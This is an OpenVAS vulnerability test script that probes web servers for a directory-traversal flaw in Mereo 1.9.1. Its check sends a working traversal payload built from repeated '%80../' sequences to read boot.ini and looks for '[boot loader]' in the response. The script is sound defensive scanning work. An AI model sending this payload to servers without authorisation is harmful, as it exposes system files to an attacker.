###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mereo_40053.nasl 8457 2018-01-18 07:58:32Z teissa $
#
# Mereo Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mereo is prone to a directory-traversal vulnerability because it fails
to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary local
files and directories within the context of the webserver. Information
harvested may aid in launching further attacks.

Mereo 1.9.1 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100636");
 script_version("$Revision: 8457 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-18 08:58:32 +0100 (Thu, 18 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-05-12 19:34:03 +0200 (Wed, 12 May 2010)");
 script_bugtraq_id(40053);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Mereo Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40053");
 script_xref(name : "URL" , value : "http://www.assembla.com/wiki/show/babsJ-LFer3B3tab7jnrAJ");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = "/%80../%80../%80../%80../%80../%80../%80../%80../boot.ini";

if(http_vuln_check(port:port, url:url, pattern:"\[boot loader\]")) {
  security_message(port:port);
  exit(0); 
}

exit(0);
